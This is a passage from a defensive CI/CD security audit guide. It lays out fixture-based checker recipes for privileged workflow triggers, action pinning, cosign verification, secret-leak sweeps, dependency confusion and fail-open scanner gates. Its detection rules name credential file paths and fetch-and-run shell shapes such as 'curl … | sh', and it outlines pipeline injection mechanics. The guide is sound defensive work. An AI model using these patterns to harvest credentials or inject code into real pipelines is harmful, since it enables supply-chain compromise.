The primary proof for [item 1](#1-privileged-triggers-untrusted-content-and-expression-injection-workflow-trigger-and-script-injection), [item 5](#5-mutable-references-the-pipeline-resolves-action-and-workflow-ref-pinning), [item 9](#9-install-time-and-lifecycle-script-execution-install-and-lifecycle-scripts), [item 12](#12-signing-and-provenance-emission-artifact-signing-and-provenance-emission) and [item 14](#14-scanners-that-do-not-gate-pipeline-scanner-gating), and the recipe that makes this lens's Critical grades provable at all.

Write a checker over the *parsed* pipeline definitions rather than over raw text — parse the YAML, walk jobs and steps — and ship **one vulnerable fixture and one clean fixture per rule** so both branches are exercised. `detect(fixtures/vulnerable/X) == 1` and `detect(fixtures/clean/X) == 0`, run by the repository's own test command. Every detector block in the checklist above is a ready-made fixture pair; use them — **under the three constraints below, each of which exists because ignoring it produces a checker that asserts a Critical is clean.**

- **A `nomatch` half is clean for the rule its pair isolates, and for that rule only.** It is not a globally clean fixture and must never be filed in a shared `fixtures/clean/` directory that every rule asserts zero against. Two pairs in this lens make the point explicitly, and both say so in the prose beneath them: item 1c's author-gated ChatOps pair and item 3's `env:`-scope pair. Both `nomatch` halves check out pull-request-controlled content under a privileged trigger, which is **row 1's Critical on its own**. A checker that reads them as clean fixtures for rule 1 asserts that a `pull_request_target` head-SHA checkout is safe — the single worst wrong clearance this lens can emit, produced by the recipe that was supposed to make its Criticals provable. Index fixtures by `(fixture, rule) → expected count`, not by directory, and where a `nomatch` half is a *narrower finding* rather than clean code, assert it flags under the rule that owns the wider finding.
- **Expand what the file calls before asserting over it.** A composite action's steps and a called reusable workflow's steps are not in the caller's YAML, so a rule walking only the caller's `jobs[*].steps` silently exempts every `uses:` and every `continue-on-error:` inside them — including the mutable-reference-inside-a-pinned-action case item 5 names. Resolve local `./…` actions and same-repository reusable workflows into the step list under test, and where a step's action is a third-party pin the checker cannot read, record it as out of scope rather than as clean.
- **The two rules below that can pass by matching nothing need the extra assertion the shared runner's rule 4 requires.** Rule 2 fires on a *missing* pin, so assert it against a fixture whose pin was deliberately removed. Rule 5 is worse than absence-shaped: it is scoped to "a step whose name or action identifies it as a scanner", so on a repository whose scanner is a bare `run: ./bin/audit` the predicate matches no step and the rule passes perfectly while every gate in the file is soft-failed. Assert the scanner-identification predicate itself is non-empty on the tree under test, and assert the rule set as a whole is non-empty, so a deleted rule cannot read as compliance.

The rules worth encoding first, in this order:

1. **The two-leg privileged-trigger rule.** A privileged trigger, plus a checkout of a pull-request ref or execution of a workspace file. Assert the vulnerable fixture flags **even though it contains no `secrets.` string** — that assertion is the whole point, and it is what stops the third-leg regression from coming back.
2. **The pin rule.** Every `uses:` value either matches `^[^./][^@]*@([0-9a-f]{40}|sha256:[0-9a-f]{64})$`, or is a local `./…` reference, or is on an explicit exemption list committed beside the test. **Both digest forms belong in that alternation:** a 40-hex commit SHA for a repository action, and an OCI `@sha256:<64 hex>` for `uses: docker://…`, which is the pin item 5 tells the auditor to adopt — a 40-hex-only rule manufactures a finding against a correctly digest-pinned Docker action. Exempt `./` refs *unless* the same job checks out untrusted content, in which case invert and require a finding.
3. **Interpolation of an injectable context into `run:`**, taken from item 1d's list rather than from a blanket `${{` match, and the `$GITHUB_ENV`/`$GITHUB_OUTPUT`/`$GITHUB_PATH` write rule including the command-substitution form with no `${{` on the line.
4. **Structural credential-path assertions,** which are pure static checks and cheap — written in two halves, because the two mechanisms differ and a single blanket rule flags correct code:
   - **Cache paths** (`actions/cache`, and every other provider's artifact globs) must not cover `**/.git/config`, `**/.npmrc`, `**/.docker/config.json`, `**/*.pem`, `**/*.key` or `.env`. No hidden-file default protects these.
   - **`actions/upload-artifact` paths** are asserted against the same list **only** when `include-hidden-files: true` is set on the step or the action resolves older than **v4.4.0** — from v4.4.0 the dot-prefixed entries are excluded by default, so asserting them unconditionally flags a plain `path: .` that uploads no credential. Independent of version, assert the **non-hidden** credential patterns for every upload path: `**/*.pem`, `**/*.key`, `**/id_rsa`, `**/credentials.json`, `**/kubeconfig`, `**/settings.xml`, `**/*serviceaccount*.json`.
5. **Gating assertions:** no `continue-on-error: true`, `|| true`, `allow_failure: true` or zeroed exit code on a step whose name or action identifies it as a scanner.

**Fails/passes:** the vulnerable fixture flags, the clean fixture does not, and the repository's own pipeline tree is clean. **On the pin rule, hold the assertion against the previous commit and require it to fail there** — a rule that passes on both revisions of a change that was supposed to introduce pins is a rule that is not looking at the file.

Two notes on scope. Comparing the current pin set against a previously recorded one is a useful *regression* check the auditor can add, but it needs a baseline file the repository does not have: generate the baseline from the current tree as part of introducing the test, and do not report the absence of such a file as a finding — no ecosystem convention establishes one, and treating a missing baseline as a defect manufactures a finding against every repository. And a dynamic run of a vulnerable workflow, if one is genuinely wanted, is a **local runner with a localhost sink and a local canary file** — never a real pull request, and never a hosted collector.

### R2 — Offline tamper detection for signing and provenance (T1)

The proof for [item 12](#12-signing-and-provenance-emission-artifact-signing-and-provenance-emission).

Generate a key pair locally, sign a fixture artifact with it, verify successfully, then mutate one byte of the artifact and assert that verification **fails**. Use the key-based verification mode so nothing contacts a transparency log or a certificate authority. Keyless verification, provenance verification against a live log and any push to a real registry are out of rails.

Pair that dynamic half with two static assertions, which are the ones that catch the real defects:

- **Every *keyless* `cosign verify` and `cosign verify-attestation` invocation carries an identity constraint and `--certificate-oidc-issuer`, and the identity pattern is anchored.** Classify first: an invocation carrying `--key` or `--certificate-chain` is key-based, does not consult Fulcio, and is **exempt** — the identity flags have no meaning there, and asserting them flags the very mode this recipe's dynamic half tells you to use. For the remaining keyless invocations assert three things, not one: both flags are present; the identity pattern is anchored (`^https://github\.com/<org>/…`) rather than `.*`, a bare substring, or a wildcard in the organization position; and neither `--insecure-ignore-tlog` nor `--insecure-ignore-sct` appears. On cosign ≥ 2 a keyless invocation missing the flags fails at run time rather than passing everything, so report that one as a broken or soft-failed gate (item 14) and check whether a `|| true` is hiding it.
- **Every published *artifact* is matched by a signing or attestation step covering that artifact** — and, separately, that something in the deploy path verifies. Where nothing does, report the "emits provenance nobody checks" asymmetry from static evidence, and route the enforcement half to **cloud-and-iac**. **Write this as a per-artifact match, never as a count**, because a count balances in both directions while the repository is broken. One signing step beside two publish steps satisfies "there is a signing step in the release path" and leaves the second artifact unsigned; a step count is not an artifact count, so a `strategy: matrix` publish job is **one** step in the YAML and one artifact per matrix leg, and a signing step carrying an `if:` that is true for a single leg leaves the rest unsigned with the counts still even. Diverging counts are just as uninformative in the other direction: a release path can legitimately hold three signing steps for one artifact — a signature, an SBOM attestation and a provenance attestation. So resolve what each step publishes and what each signing step covers, and report the artifacts with no covering step by name.

**Fails/passes:** the mutated artifact fails verification; a keyless `cosign verify` with `--certificate-identity-regexp '.*'`, with a missing flag, or with `--insecure-ignore-tlog` is flagged; `cosign verify --key cosign.pub <ref>` is **not** flagged; a publish step with no signing sibling is flagged.

### R3 — Secret-leak sweep over locally produced logs and artifacts (T1)

The proof for [item 3](#3-ci-secret-and-token-handling-ci-secret-and-token-handling).

Seed a canary value from the **canary fixture set** into the pipeline's environment, run the build locally (the repository's own build or test command, or a local workflow runner), then sweep the captured logs and the artifact directory for the canary **and for its derived encodings** — base64, base64url, hex, URL-encoded, JSON-escaped, and the value split across a line break. The derived-encoding sweep is the valuable part: the literal is what a masker catches and the encodings are what it misses.

**Read the collector's manifest before reading the sweep's verdict.** The component asserts its own manifest is non-empty and throws otherwise, and that assertion is the whole reason this recipe can report a clean result at all: a sweep pointed at an artifact directory the build never created returns zero hits over zero bytes, which is a perfect clearance and no evidence whatsoever. Quote the collected byte count beside the verdict, the same way the §0 sweeps require a file count beside a zero.

Add the structural credential-path assertions from R1 item 4 — both halves, cache paths and version-qualified upload paths — which need no run at all, and note the limit honestly: this proves what *this* build wrote locally. It cannot prove anything about the provider's masking, its log retention or its artifact retention — all three are in *What cannot be determined from a repository*, and downloading real run logs from the provider's API is out of rails.

**Fails/passes:** a vulnerable fixture that base64-encodes the canary before printing it is caught; a clean fixture that passes the credential to a client flag is not.

### R4 — Fixture-pair tests for registry resolution and install integrity (T1)

The proof for [item 6](#6-dependency-pinning-and-lockfiles-dependency-pinning-and-lockfiles) and [item 7](#7-registry-configuration-and-dependency-confusion-dependency-confusion-and-registry-config).

Parse the resolution configuration — `.npmrc`, `pip.conf`/`pip.ini`, `pyproject.toml` (`[[tool.uv.index]]`, `[[tool.poetry.source]]`), `settings.xml` — and assert, against fixture pairs: every internal dependency name in the manifest is either scoped to an internal registry or bound to an explicit single index; no `--extra-index-url` or `PIP_EXTRA_INDEX_URL` appears alongside an internal index; every Poetry source that a package depends on has `priority = "explicit"`; every install command in CI and in the Dockerfiles is a frozen-install verb for its ecosystem; and the Dockerfile copies the lockfile before installing from it.

**Fails/passes:** the vulnerable fixture — an unscoped internal name plus `--extra-index-url` — flags; the clean fixture with a single `--index-url` and `--require-hashes` does not.

### R5 — Local registry substitution (T2)

The dynamic half of [item 7](#7-registry-configuration-and-dependency-confusion-dependency-confusion-and-registry-config), and it will report UNPROVEN in most repositories.

Stand up a local package registry in a container, publish a higher-versioned package under the internal name to it, run the repository's install command, and assert which one resolved. **This must run with networking disabled** so the real public registry cannot answer and the test cannot accidentally consult it — without that, the recipe both proves nothing and reaches a third party. It is T2 because the repository does not stand up a registry in its own test command, so the user is asked; expect most audits to rest on R4 alone and to say so in the coverage block.

### R6 — Fail-open injection at a scanner's dependency boundary (T1)

The proof for [item 14](#14-scanners-that-do-not-gate-pipeline-scanner-gating).

Stub the dependency the gate consults — the advisory database fetch, the policy-bundle download, the scanner's API token exchange — with a local sink you control, then run the gate and assert it **fails the build** in each case below. **Do not test only the timeout**, and do not write the finding as "no `set -e`": `-e` is already on in the runner's default `run:` shell (`bash -e {0}`), so a bare `curl` that cannot connect *does* fail the step, and a recipe that proves only that proves the thing that already works. `pipefail` is what is off. The cases that separate a real gate from a decorative one:

- **HTTP 404 and HTTP 500 carrying a body.** `curl` without `--fail` exits **0** and writes the error page to the output path. Whether the step then fails depends entirely on what consumes the file, so stub both consumers: one that chokes on the body and one that shrugs at it.
- **HTTP 200 with a body that parses to nothing:** `{}`, `null`, `[]`, an empty rule directory, and a **valid but empty** archive. This is the case worth building the harness for, because no shell option closes it — the fetch succeeded and the file parsed. Include a zero-byte and a truncated archive too, but do not claim credit for them: measured, `tar -xzf` exits **2** on both, so `-e` already fails those closed.
- **A connection that hangs** past any timeout the step sets — and if the step sets none, that is the finding.
- **A pipe whose last command succeeds** (`curl -fsSL … | sh`, `curl … | tee out`) and an **`export`/`declare`/`local`/prefix assignment** or `echo "$( … )"` wrapping the fetch. These are where `pipefail`'s absence and a discarded substitution status actually bite — measured exit 0 under `-e`. A pipe into a command that itself fails on the body (`| tar -xz`) and a **bare** `V=$( … )` assignment are **not** in this set: `-e` aborts on both, measured, so a recipe asserting them proves nothing.

**Fails/passes:** the gate exits non-zero on every case above, and the assertion is that it does. Worked example, measured rather than assumed. A step written as `curl -sSL -o rules.tar.gz … ; tar -xzf rules.tar.gz ; scan --rules ./rules` fails **closed** on connection-refused, on a 404 HTML body, on a zero-byte archive and on a truncated one — `tar -xzf` exits 2 on all four and `-e` aborts the step — so none of those four is the finding for *this* step shape. It fails **open** on the valid-but-empty archive, where `tar` exits 0 and the scan runs against zero rules. The step shapes that fail open on the *fetch itself* are different steps: `curl -fsSL … | sh`, `export RULES=$(curl …)`, and `continue-on-error: true` on the fetch job. Assert against the shape the repository actually has; a step written with `--fail`, `set -o pipefail`, and an explicit "the bundle exists, is non-empty and parses" check passes every case in the list.

### Not provable here, and reported as such every run

Name these in the coverage block rather than letting silence imply safety.

- **Whether a pinned dependency or action is benign.** A 40-hex SHA proves immutability. Reviewing the pinned commit is manual, and a tag-retargeting compromise of a popular action is defeated by pinning without being detected by any automated check.
- **Real provider behaviour:** secret masking, log and artifact retention, cache-scope isolation, and federated-token trust-policy evaluation. Only the provider can demonstrate these.
- **Every repository and organization setting** in *What cannot be determined from a repository* — branch and tag protection, required reviews and checks, repository visibility, token defaults, fork-approval policy, environment approvers, runner ephemerality, scanning enablement, and registry account hygiene. These are questions with owners, not findings.
- **Whether an internal package name is registered on a public registry,** and whether a suspicious name is a squat. Both need registry queries, which the rails forbid; hand over the exact names to check.
- **Whether anyone acts on a scanner's output, or merges a dependency update pull request.** The workflow proves the scan runs.
- **End-to-end exploitation of a privileged-trigger finding.** The proof would require opening a pull request against a live repository. R1 proves the detection; the exploit chain is argued from the quoted trigger, the quoted checkout and the quoted credential.
